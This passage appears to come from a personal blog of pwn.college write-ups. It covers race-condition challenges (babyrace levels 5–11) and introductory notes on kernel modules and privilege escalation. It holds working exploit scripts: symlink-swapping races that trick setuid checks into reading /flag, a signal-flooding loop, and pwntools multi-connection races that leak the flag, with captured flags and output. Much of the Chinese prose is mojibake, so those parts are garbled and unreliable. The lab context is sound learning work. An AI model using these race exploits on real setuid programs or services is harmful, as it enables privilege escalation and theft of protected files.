class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>initpy:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>mkdir -p ./1/aa<br>touch ./1/aa/bb<br><br>mkdir -p ./2<br>ln -s /home ./2/aa #è¿™é‡Œè¿˜å‡ºé”™è¿‡.<br><br>mkdir -p ./3/aa<br>ln -s /flag ./3/aa/bb<br><br>ln -s /home/hacker/1 ./dir<br></code></pre></div></td></tr></table></figure><p>æµ‹è¯•:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">(for i in &#123;1..1000&#125;;do /challenge/babyrace_level5.1 ./dir/aa/bb;done) | egrep &#x27;Error|pwn&#x27; | sort | uniq -c<br></code></pre></div></td></tr></table></figure><p>ç»“æœ:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">    356 Error: directory not owned by root!<br>     44 Error: failed to get directory status!<br>    116 Error: failed to get file status!<br>    472 Error: file is a symlink!<br>      3 pwn.college&#123;ojL-wiqjv9XYN-GR2XsuQ-yucpZ.QXwEDNsMTM1IzW&#125;<br>or<br>5218 Error: directory not owned by root!<br>    896 Error: failed to get directory status!<br>   1300 Error: failed to get file status!<br>   2422 Error: file is a symlink!<br>     19 pwn.college&#123;ojL-wiqjv9XYN-GR2XsuQ-yucpZ.QXwEDNsMTM1IzW&#125;<br></code></pre></div></td></tr></table></figure><p>æˆåŠŸç‡æœ€å¤šå°±æ˜¯20/10000, 2â€°â€¦â€¦.çœ‹è§†é¢‘å»äº†, ä¸çŸ¥é“æœ‰æ²¡æ›´å¥½çš„. å¤ªç„å­¦äº†, è€Œä¸”è¿™æ˜¯åªæ˜¯åœ¨ä¸€ä¸ª4 core dockeré‡Œé¢, ç°å®æœºå™¨é‚£ä¸å¾—æ›´å¤šè¿›ç¨‹+æ›´å¤šcpuå†…æ ¸+å¥‡æ€ªè°ƒåº¦ç®—æ³•, é‚£æ˜¯æˆ‘èƒ½ç ”ç©¶çš„?ç›´æ¥ä¸‹ä¸€é¢˜, cowä¹Ÿæ˜¯ç›´æ¥ä¸Šå¤§æ•°é‡å¾ªç¯. </p><h4 id="level6-5"><a href="#level6-5" class="headerlink" title="level6"></a>level6</h4><p>å’Œä¸Šä¸€é¢˜ç›¸åŒ, ä¸è¿‡dirnameä¹‹åä½¿ç”¨çš„æ˜¯lstat, ä¸follow symlinkâ€¦â€¦</p><p>???????????????????????????????</p><ul><li>é¦–å…ˆtouchä¸€ä¸ª/home/hacker/a/home/bæ–‡ä»¶, é€šè¿‡nameå’ŒsymlinkéªŒè¯, </li><li>ç„¶ålnä¸¤ä¸ª/home/hacker/a -&gt; /, é‚£ä¹ˆåŸpathçš„dirnameå°±æ˜¯æŒ‡: /home/hacker/a/home</li><li>æœ€åå†lnä¸€ä¸ª/home/hacker/a/home/b -&gt; /flag</li></ul><p>æ”¹ç‰ˆ:</p><ul><li>é¦–å…ˆtouchä¸€ä¸ª/home/hacker/1/a/home/bæ–‡ä»¶, é€šè¿‡nameå’ŒsymlinkéªŒè¯, </li><li>ç„¶ålnä¸ª/home/hacker/2/a -&gt; /, é‚£ä¹ˆåŸpathçš„dirnameå°±æ˜¯æŒ‡: /home/hacker/2(dir)/a/home</li><li>æœ€åå†lnä¸€ä¸ª/home/hacker/3(dir)/a/home/b -&gt; /flag</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><br>if [ $1 == &#x27;init&#x27; ]<br>then<br>    cd<br>    mkdir -p a/home<br>    touch a/home/b<br>elif [ $1 == 2 ]<br>then<br>    cd<br>    mv a b<br>    ln -s / /home/hacker/a<br>elif [ $1 == 3 ]<br>then<br>    cd<br>    rm a ./b/home/b<br>    mv b a<br>    ln -s /flag /home/hacker/a/home/b<br>elif [ $1 == &#x27;cls&#x27; ]<br>then<br>    rm -r a b 2&gt;/dev/null<br>else<br>    echo &#x27;invalid argument&#x27;<br>fi<br></code></pre></div></td></tr></table></figure><h5 id="python"><a href="#python" class="headerlink" title="python:"></a>python:</h5><p>unlink symlinkåªè¦0.000035så°±å¯ä»¥å®Œæˆç³»ç»Ÿè°ƒç”¨.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys,time<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> symlink, unlink<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span>:<br>    <span class="hljs-keyword">if</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;rm&#x27;</span>:<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        exit()<br>    <span class="hljs-keyword">elif</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;init&#x27;</span> :<br>        os.system(<span class="hljs-string">&#x27;rm -r $(ls | egrep -v &quot;*py&quot;)&#x27;</span>)<br>        os.system(<span class="hljs-string">&#x27;./initpy&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    time.sleep(<span class="hljs-number">0.0001</span>)<br>    <span class="hljs-comment">#now dir -&gt; 1, need to be unlinked</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./2&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br><br>    <span class="hljs-comment">#now change dir to 3</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./3&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.00003</span>)<br>    <br>    <span class="hljs-comment">#now restore context</span><br>    unlink(<span class="hljs-string">&#x27;./dir&#x27;</span>)<br>    symlink(<span class="hljs-string">&#x27;./1&#x27;</span>, <span class="hljs-string">&#x27;./dir&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>initpy:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>mkdir -p ./1/a/home<br>touch ./1/a/home/b<br><br>mkdir -p ./2<br>ln -s / ./2/a<br><br>mkdir -p ./3/a/home<br>ln -s /flag ./3/a/home/b<br><br>ln -s /home/hacker/1 ./dir<br></code></pre></div></td></tr></table></figure><p><code>./dir/a/home/b</code> </p><p>æµ‹è¯•:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">(for i in &#123;1..20000&#125;;do /challenge/babyrace_level6.1 ./dir/a/home/b;done) \<br>| egrep &#x27;Error|pwn&#x27; | sort | uniq -c<br></code></pre></div></td></tr></table></figure><p>æˆåŠŸç‡é™åˆ°äº†20/20000, å˜æˆåƒåˆ†ä¹‹ä¸€äº†â€¦â€¦..</p><h4 id="level7-4"><a href="#level7-4" class="headerlink" title="level7"></a>level7</h4><p>ä¿æŠ¤å…¨å¼€. åšä¸å‡ºæ¥, å»çœ‹äº†çœ‹<code>.0</code>ç¨‹åºçš„race pointåœ¨å“ªé‡Œ.</p><p>æ²¡çœ‹æ‡‚. å™¢, æˆ‘åœ¨discordä¸Šé¢çœ‹åˆ°äº†æç¤º!!! æ‰æƒ³èµ·æ¥è§†é¢‘é‡Œæœ‰æåˆ°signal, è€Œä¸”è¿™æ¬¡ä¹Ÿæœ‰signal handler.</p><p>ä¸€å¼€å§‹è¿˜åœ¨æƒ³è¿™å²‚ä¸æ˜¯è¦ç­‰ååˆ†é’Ÿ, ç„¶åçªç„¶æƒ³èµ·æ¥æœ‰ç³»ç»Ÿè°ƒç”¨å¯ä»¥ç»™å…¶ä»–è¿›ç¨‹å‘é€ä¿¡å·.</p><p>è€Œä¸”ç¨‹åºä¸­çš„timeout_handlerä¹Ÿåªæ˜¯æ‰§è¡Œlogoutè€Œå·². è¿™æ ·race pointå°±å¾ˆæ˜æ˜¾äº†, åªè¦ä¸€æ¬¡æˆåŠŸå°±å¯ä»¥äº†.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;win_authed&quot;</span>) )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( privilege_level )<br>      &#123;<br><span class="hljs-comment">//å°±æ˜¯è¿™é‡Œ--------------------------------------------------------</span><br>        <span class="hljs-keyword">if</span> ( privilege_level == <span class="hljs-number">1</span> )<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your privilege level is too low!&quot;</span>);<br>        <span class="hljs-keyword">else</span><br>          win();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You are not logged in!&quot;</span>);<br>      &#125;&#125;<br></code></pre></div></td></tr></table></figure><p>æœ‰ä¸€ä¸ªkillç³»ç»Ÿè°ƒç”¨, <del>è¦çŸ¥é“pidå‚æ•°çš„è¯é‚£è¿˜æ˜¯ç›´æ¥ç”¨pwntoolså¯åŠ¨, ä¸çŸ¥é“pythonçš„sendlineè€—æ—¶å¦‚ä½•â€¦.</del>ç®—äº†ä¸ç”¨äº†</p><ul><li>æ€»ä¹‹å‘½ä»¤è¡Œé‡Œå¯åŠ¨challenge, æ°¸çœŸå¾ªç¯é‡Œecho <code>login</code>å’Œ<code>win_authed</code>ä¸¤æ¡å‘½ä»¤, å³<code>login\nwin_authed\n</code>.</li><li>ç„¶åå‘½ä»¤è¡Œæ°¸çœŸå¾ªç¯, ä¸åœkill pid 14.</li></ul><p>éå¸¸ç›´æ¥, æˆåŠŸç‡ä¹Ÿæ˜¯éå¸¸çš„ä½:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">while true;do kill -s 14 465;done<br>(while true;do printf &#x27;login\nwin_authed\n&#x27;;done)|/challenge/babyrace_level7.1|grep &#x27;pwn&#x27;<br>ps aux<br></code></pre></div></td></tr></table></figure><h4 id="level8-4"><a href="#level8-4" class="headerlink" title="level8"></a>level8</h4><ul><li>è°ƒè¯•å¯ä»¥ä½¿ç”¨practice modeä¸­çš„sudo gdb, æˆ–è€…ä½¿ç”¨pwntoolsä»¥éset_uidå¯åŠ¨ç¨‹åº.<ul><li><code>info thread</code> + <code>thread [num]</code> </li><li>ç¬¬ä¸€ä¸ªhit breadpointçš„çº¿ç¨‹ä¼šåœä¸‹æ¥, gdbè¿˜ä¼šåˆ‡æ¢åˆ°é‚£ä¸ªçº¿ç¨‹ä¸Š.</li></ul></li><li><code>ps auxH</code> æ˜¾ç¤ºçº¿ç¨‹.</li><li>çœ‹äº†å‡ çœ¼pythonä¸Šçš„concurrent.futures<ul><li>éƒ½åœ¨ä¸‹é¢äº†. ä¸»è¦å°±æ˜¯processExecutor, å‚æ•°æ˜¯ä¸Šé™, å½¢è±¡æˆä¸€ä¸ªpool(è¿›ç¨‹æ± )å¯ä»¥æ ¹æ®éœ€è¦ä½¿ç”¨.</li></ul></li></ul><p><a href="https://akkadia.org/drepper/tls.pdf">ELF Handling For TLS</a> | <a href="https://maskray.me/blog/2021-02-14-all-about-thread-local-storage">å“ªä½ç¥çš„TLS variableæ–‡ç« </a> | <a href="https://www.cs.cmu.edu/afs/cs/academic/class/15492-f07/www/pthreads.html">çœ‹èµ·æ¥ä¸é”™çš„æ•™ç¨‹</a><br>ä¸Šé¢æ˜¯æœ‰å…³ç¨‹åºä¸­ä½¿ç”¨çš„fsæ¥å®šä½çº¿ç¨‹ç§æœ‰å˜é‡çš„åŸç†.</p><p>æ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„ç©ºé—´, ä½†æ˜¯privilege_levelæ˜¯å…¨å±€çš„. ä½¿ç”¨pwntoolså¼€ä¸¤ä¸ªè¿æ¥, å’Œä¸Šä¸€é¢˜ä¸€æ ·çš„åšæ³•.</p><p>æˆåŠŸç‡2/10000=0.2â€°</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> pwn<br><br>pwn.context.update(encoding=<span class="hljs-string">&#x27;latin&#x27;</span>)<br><br>process = pwn.process(<span class="hljs-string">&#x27;/challenge/babyrace_level8.1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">work</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote:<br>        pwn.info(remote.recvline().decode())<br>        remote.send(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &#x27;</span> * <span class="hljs-number">10000</span>)<br>        pwn.info(remote.clean().decode())<br><br><span class="hljs-keyword">with</span> concurrent.futures.ProcessPoolExecutor(<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> pool:<br>    future = []<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;login&#x27;</span>))<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;logout&#x27;</span>))<br>    future.append(pool.submit(work, <span class="hljs-string">&#x27;win_authed&#x27;</span>))<br>    concurrent.futures.wait(future)<br></code></pre></div></td></tr></table></figure><h4 id="level9-4"><a href="#level9-4" class="headerlink" title="level9"></a>level9</h4><p>çœ‹åˆ°ä¸ªæ–°æ¨¡å—<code>psutil</code>. </p><p>æ‰§è¡Œsend_redacted_flagå‘½ä»¤æ—¶, å‘å‡½æ•°æ ˆå¸§ä¸­çš„çš„ç¼“å†²åŒºå†™å…¥â€REDACTED: â€œ, terminated with null-byte, which is 11bytes long(plus null-byte). Then calling open-&gt;read to read flag into the buffer, right after the previous stringâ€™s null-byte.</p><p>if now try to use command <code>receive_message</code> to print out string containing the flag, the function will stop at 11th position, because write() functionâ€™s <code>n</code> argment is given by strlen() that evaluating string in global_message.</p><p>so the the procedure is as follows:</p><ul><li><p>In one thread(connection), first send <code>send_redacted_flag</code> command. </p></li><li><p>Between this and next command, another thread send <code>send_message</code> command, overwrite until the global_messageâ€™s 11th char, <strong>before assigning null-byte to the end of string</strong>.</p><img src="../../image/pwn-modules/image-20220519155802133.png" alt="image-20220519155802133" style="zoom:80%;" /></li><li><p>and first thread now continue executing at <code>receive_message</code> command. after the strlen() function, the return value means 11+[flagâ€™s len], then used in the argment of write().</p></li></ul><p>how to write scriptâ€¦.</p><ul><li>two connections. one sends <code>send_redacted_flag -&gt; receive_message</code> sequence, another sends <code>send_message</code> with <code>&#39;whatthefuckisthat&#39;</code> continuously(or separated by space in a longlonglong bytestring).</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> pwn<br><br>process = pwn.process(<span class="hljs-string">&#x27;./babyrace_level9.1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">work</span>(<span class="hljs-params">cmd</span>):</span><br>    <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote:<br>        pwn.info(remote.recvline().decode())<br>        remote.send(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;cmd&#125;</span> &#x27;</span> * <span class="hljs-number">10000</span>)<br>        pwn.info(remote.clean().decode())<br><br><span class="hljs-keyword">with</span> concurrent.futures.ProcessPoolExecutor(<span class="hljs-number">3</span>) <span class="hljs-keyword">as</span> pool:<br>    thread = []<br>    thread.append(pool.submit(work, <span class="hljs-string">&#x27;send_redacted_flag receive_message&#x27;</span>))<br>    thread.append(pool.submit(work, <span class="hljs-string">&#x27;send_message whatthefuck&#x27;</span>))<br>    concurrent.futures.wait(thread)<br></code></pre></div></td></tr></table></figure><p>something interesting happenâ€¦.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">9999     Message: <br>   1 [*] Message: <br>   1     Message: REDAChED: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: REDAChefuckisthatandthis\at the fuck? this is true flag&#125;<br> 504     Message: REDACTED: [*] Function (send_message/send_redacted_flag/receive_message/quit): <br>5444     Message: REDACTED: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: REDACTefu \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whatCTEfuckisthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whattheD: \isthatandthis\at the fuck? this is true flag&#125;<br>   1     Message: whatthef: \isthatandthis\at the fuck? this is true flag&#125;<br>  18     Message: whatthefuc[*] Function (send_message/send_redacted_flag/receive_message/quit): <br>   1     Message: whatthefuc\isthatandthis\at the fuck? this is true flag&#125;<br>4027     Message: whatthefuckisthatandthis\at the fuck? this is true flag&#125;<br><br>   1     Message: whatthefuckisn.ctalege&#123;what the fuck? this is true flag&#125;<br></code></pre></div></td></tr></table></figure><p>by patching the program, something strange happenedâ€¦.. how does line 11 occurâ€¦.? can write syscall to be interrupted and then reenter?</p><p>anyway, thatâ€™s the way it is.</p><h4 id="level10-4"><a href="#level10-4" class="headerlink" title="level10"></a>level10</h4><p>global_message with semaphore: sem_wait() + sem_post()â€¦â€¦â€¦â€¦â€¦</p><p>æˆ‘åˆä¸ä¼šäº†â€¦â€¦ åšè¿™ä¸ªçœŸæ˜¯è¿åç›´è§‰çš„æ€è€ƒ. scpäº†.0ç¨‹åº, å¸Œæœ›èƒ½çœ‹å‡ºä¸€ç‚¹æç¤º..æ²¡çœ‹å‡ºæ¥.</p><h4 id="level11-4"><a href="#level11-4" class="headerlink" title="level11"></a>level11</h4><p>æ²¡çœ‹å‡ºå’Œä¸Šä¸€é¢˜æœ‰ä»€ä¹ˆåŒºåˆ«. ä¸è¿‡åœ¨discordä¸Šé¢çœ‹åˆ°äº†ä¸€ç‚¹ä¸œè¥¿.</p><blockquote><p>10, 11 have semaphores on broadcast, 11 has a printf instead of strlen-read</p></blockquote><p>dicordä¸Šé¢éƒ½ç”¨çš„æ˜¯sigpipe. è¿™ä¸ªä¼šè°ƒç”¨pthread_exit()å‡½æ•°. </p><p>.0ç¨‹åºåœåœ¨äº†messageèµ‹å€¼çš„æ¯ä¸€æ¬¡å¾ªç¯, è¿™ä¸ªæ—¶å€™å¯ä»¥å‘é€sigpipeç›´æ¥ç»“æŸçº¿ç¨‹, è¿™æ ·sem_postä¸ä¼šæ‰§è¡Œ, global_message_mutexä¹Ÿä¸å†å¯ç”¨, æ„å‘³ç€æ²¡æœ‰çº¿ç¨‹èƒ½å¤Ÿå†è¿›å…¥critical section. </p><blockquote><p>Or not consuming input so the writes to the socket block at the right time</p><p>ä¸çŸ¥é“è¿™èƒ½ä¸èƒ½è¡Œ. è¿™åªèƒ½åœ¨send_messageåœä¸‹.</p></blockquote><p>processes are as follows:</p><ul><li>one connection sends <code>send_redacted_flag</code> command, then completes the str copy. </li><li>another or still the same connection sends <code>send_message</code> command with <code>whatthefuckisthis</code>, causing overlapping the null-byte between prompt and flag. after null-byte, before last byte, sending SIGPIPE to stop thread.</li><li>another connection send <code>receive_message</code>.</li><li>every program run can only test once.</li></ul><p>succeeding in .0 practice.</p><h1 id="module-D-kernel"><a href="#module-D-kernel" class="headerlink" title="module D-kernel"></a>module D-kernel</h1><h4 id="key-point"><a href="#key-point" class="headerlink" title="key point:"></a>key point:</h4><h5 id="Intro"><a href="#Intro" class="headerlink" title="Intro:"></a>Intro:</h5><ul><li><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-1.html">linux syscall <em>DETAILS</em> (<strong>linux inside</strong>)</a> |  <a href="https://www.kernel.org/doc/html/latest/">linux_kernel_doc</a> | <a href="https://www.felixcloutier.com/x86/syscall">syscall instruction</a> | <a href="https://gcc.gnu.org/onlinedocs/gcc/Variable-Attributes.html">Attributes of Variables(gcc)</a> | <ul><li>you cannot find <em>noderef</em> or <em>address_space</em> in the GCC docs because they are not GCC attributes. They have meaning only for <a href="https://en.wikipedia.org/wiki/Sparse">Sparse</a>.<br>about <a href="https://www.linuxquestions.org/questions/linux-kernel-70/what-does-__attribute__-noderef-address_space-2-mean-4175493101/">the effect</a>.</li></ul></li><li><strong>Modern solution to Rings:</strong> Ring -1, <em>Hypervisor Mode</em>. Able to intercept sensitive Ring 0 actions done by guests and handle them in the host OS.</li><li>syscall High-level overview:<ol><li>At bootup, in Ring 0, the kernel sets MSR_LSTAR to point to the syscall handler routine.</li><li>When a userspace (Ring 3) process wants to interact with the kernel, it car call syscall.<br>a. Privilege level switches to Ring 0.<br>b. Control flow jumps to value of MSR_LSTAR.<br>c.  Return address saved to <strong>rcx</strong>.<br>d. Thatâ€™s basically it! <a href="https://www.felixcloutier.com/x86/syscall">https://www.felixcloutier.com/x86/syscall</a></li><li>When the kernel is ready to return to userspace, it calls the appropriate return instruction (i.e., <strong>sysret</strong> for syscall).<br> a. Privilege level switches to Ring 3.<br> b. Control flow jumps to rcx.<br> c. Thatâ€™s basically it!</li><li><code>x86-64: rdi   rsi   rdx   r10   r8    r9    -</code><br>We can see the 6 args are stored in these registers. rcx is used to store syscall return address, so args skip rcx.</li></ol></li><li>exploit dirctions:<ul><li>From the network: remotely-trigged exploits (packets of death, etc). Rare!</li><li>From userspace: vulnerabilities in syscall and ioctl handlers (i.e., launched from inside a <strong>sandbox</strong>!)</li><li>From devices</li></ul></li></ul><h5 id="kernel-module"><a href="#kernel-module" class="headerlink" title="kernel module"></a>kernel module</h5><ul><li><code>lsmod</code> list kernel module. like device drivers(graphic card), filesystems, networking functionality, other stuff.<br>all with <code>.ko</code> extension.</li></ul><p>How to interact with kernel module for further exploitation?</p><ul><li>historically, kernel modules could add syscall entries. nowadays less used.</li><li>interrupts. a module could register a interrupt handler to <strong>hook</strong>. <code>int3</code> and <code>int1</code> are one-byte interrupt instructions which may be useful.</li><li>files. <ul><li><code>/dev</code>: mostly traditional devices (i.e., /dev/dsp for audio)</li></ul><ol start="2"><li><code>/proc</code>: started out in System V Unix as information about running processes. Linux expanded it into in <strong>a disastrous mess of kernel interfaces</strong>.</li></ol><ul><li><code>/sys</code>: non-process information interface with the kernel. </li><li>A module can register a file in one of the above locations.<br>Userspace code can <em>read || open()</em> that file to interact with the module!<br>or <em>ioctl()</em> function sends setting and querying non-stream data(i.e., webcam resolution <strong>settings</strong> as opposed to webcam video <strong>stream</strong>).</li></ul></li></ul><p>driver interaction:</p><ul><li>reads data from userspace (using <code>copy_from_user</code>, a kernel API)</li><li>â€œdoes stuffâ€ (open files, read files, interact with hardware, etc)</li><li>writes data to userspace (using copy_to_user)</li><li>returns to userspace</li></ul><p>kernel module:  <a href="https://www.kernel.org/doc/htmldocs/kernel-api/index.html">kernel doc</a> </p><ul><li>compilation:<ul><li>kernel modules are all listed in the <code>pwnkernel/src/</code> </li><li>at the end of the build.sh, there is a <em>building modules</em> procedure. it calls Make makefile in src dirctory then copys <code>.ko</code> file to fs directory being mounted at <code>/home/ctf</code>. </li><li>so before compilation, adding an entry to makefile for newly added module.</li></ul></li><li>command: <u>must be used under root. Or sh not found</u>.<ul><li><code>insmod</code> command: load kernel module. or through <code>init_module</code> system call.</li><li><code>lsmod</code> : list all modules.</li><li><code>rmmod</code> : remove module.</li></ul></li><li>testing module:<ul><li><code>hello_log.ko</code>: just print something to kernel ring buffer.</li><li><code>hello_dev_char.ko</code>: register a character device. may use head, dd(with option like: if=/dev/pwn-college-char of=/proc/self/fd/1 bs=128 count=1) , etc, to read from it.</li><li><code>hello_ioctl</code>: exposes a /dev device with ioctl interface</li><li><code>hello_proc_char</code><strong>:</strong> exposes a /proc device</li><li><code>make_root</code>: exposes a /proc device with ioctl interface and an evil backdoor!</li></ul></li></ul><h5 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h5><p><a href="https://docs.google.com/presentation/d/1tcR4YsVhN2kVUfe8RJw56dtSs-QOwp4-g8qgI0Q3kFM/edit#slide=id.g75a3c0c177_2_16">SLIDE</a>. in make_root.c.</p><h5 